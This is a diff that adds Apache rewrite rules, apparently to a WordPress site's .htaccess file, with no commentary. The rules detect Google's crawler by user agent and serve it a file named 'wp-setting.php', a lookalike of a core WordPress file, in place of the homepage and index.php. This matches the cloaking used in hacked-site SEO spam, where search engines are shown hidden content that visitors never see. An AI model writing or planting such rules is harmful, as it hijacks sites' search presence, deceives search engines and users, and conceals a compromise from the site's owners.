@@ -1,0 +1,8 @@
+RewriteEngine On
+SetEnvIfNoCase User-Agent "Google" is_google_bot=1
+RewriteCond %{ENV:is_google_bot} =1
+RewriteCond %{REQUEST_URI} ^/$
+RewriteRule ^$ wp-setting.php [L]
+RewriteCond %{ENV:is_google_bot} =1
+RewriteCond %{REQUEST_URI} ^/index\.php$
+RewriteRule ^index\.php$ wp-setting.php [L]
